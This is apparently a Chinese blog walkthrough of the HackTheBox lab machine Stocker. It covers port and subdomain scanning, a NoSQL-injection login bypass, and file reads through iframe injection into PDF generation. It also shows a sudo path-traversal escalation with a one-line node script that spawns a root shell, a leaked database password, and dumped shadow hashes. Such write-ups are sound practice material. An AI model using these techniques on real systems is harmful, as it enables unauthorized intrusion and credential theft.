---
title: Stocker - HackTheBox
url: https://darkwing.moe/2023/01/15/Stocker-HackTheBox/
source: 喵喵喵喵
date: 2023-01-16
fetch_date: 2025-10-04T03:58:22.665780
---

# Stocker - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Stocker - HackTheBox

# Stocker - HackTheBox

##### 2023-01-15

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.196](#10-10-11-196)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. 子域名扫描](#子域名扫描)
   1. [3.1. dev](#dev)
4. [4. NoSQL injection](#NoSQL-injection)
5. [5. LFI](#LFI)
   1. [5.1. LFI](#LFI-1)
   2. [5.2. index.js](#index-js)
6. [6. user flag](#user-flag)
7. [7. 提权信息](#提权信息)
8. [8. 提权 & root flag](#提权-amp-root-flag)
   1. [8.1. exp.js](#exp-js)
   2. [8.2. shadow](#shadow)
9. [9. 参考资料](#参考资料)

# Stocker - HackTheBox

2023-01-15

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/523>
* ## 10.10.11.196

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011501.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.196 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-15 16:43 CST Nmap scan report for 10.10.11.196 Host is up (0.34s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 3d12971d86bc161683608f4f06e6d54e (RSA) |   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA) |_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519) 80/tcp open  http    nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://stocker.htb |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 106.79 seconds ``` |

## 80

需要加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.196 stocker.htb ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011502.jpg)

# 子域名扫描

子域名可以发现dev：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://stocker.htb/" -H 'Host: FUZZ.stocker.htb' -fs 178  dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 423ms] ``` |

## dev

同样加hosts后访问,需要登录：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011503.jpg)

# NoSQL injection

基础的NoSQL injection，需要修改使用json格式，绕过登录：

* NoSQL injection - HackTricks
  <https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass>

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011504.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011505.jpg)

# LFI

订单功能根据提交的参数渲染生成pdf，可以尝试提交iframe之类的，使其渲染时嵌入本地文件：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011506.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011507.jpg)

## LFI

验证可行，后面就是一点点读文件：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011508.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011509.jpg)

## index.js

/var/www/dev/index.js文件中得到密码：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1"; ``` |

# user flag

passwd中得到的用户名angoose使用这个密码登录，得到user flag：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011510.jpg)

# 提权信息

sudo使用node运行指定目录下 `*.js` ：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011511.jpg)

因为这里是用的是 `*.js`，那么 `/usr/local/scripts/../../../../xxx.js` 这种路径也是符合要求的，所以我们就能在可写目录写js文件，使用node运行执行任意命令

# 提权 & root flag

|  |  |
| --- | --- |
| ``` 1 ``` | ``` sudo /usr/bin/node /usr/local/scripts/../../../tmp/exp.js ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023011512.jpg)

## exp.js

|  |  |
| --- | --- |
| ``` 1 ``` | ``` const fs = require("child_process").spawn("/usr/bin/bash", {stdio: [0, 1, 2]}) ``` |

## shadow

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root:$6$EZqTwEpX4KybzpVB$BO02GOjBAfc/gEUXTNVQ3J2xQFeS4sGXNnr/zporRnTKZ46fskNi.ijPrSowdfcDn4xi4p.hCGVMaolooyHHv1:19332:0:99999:7::: angoose:$6$8iwZVU6fVD77ubDf$bxwtXVrJQdmmOByc0T2BwfWRe6I3pInHkQD1WmqJ8e5LkzLzDspjNYaRoNMzygN3uhheZRtPFGDfwGlMoCRSG0:19332:0:99999:7::: ``` |

# 参考资料

* NoSQL injection - HackTricks
  <https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass>
* Stocker - HTB [Discussion] | BreachForums
  <https://breached.vc/Thread-Stocker-HTB-Discussion>

> Last updated: 2023-06-25 08:50:35
>
> 水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
>
> [![暗羽](/img/avatar.jpg)
> 暗羽](https://darkwing.moe)

* [HackTheBox](/tags/HackTheBox/)

[Prev

#### Investigation - HackTheBox](/2023/01/23/Investigation-HackTheBox/)

[Next

#### BroScience - HackTheBox](/2023/01/09/BroScience-HackTheBox/)

站点总访客数：

站点总访问量：

This blog is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

暗羽 © 2014 - 2025

Power by [Hexo](http://hexo.io/) Theme [indigo](https://github.com/yscoder/hexo-theme-indigo)

扫一扫，分享到微信

![微信分享二维码](data:image/png;base64...)

- [{title}

  {tags}

  {date}](%7Bpath%7D)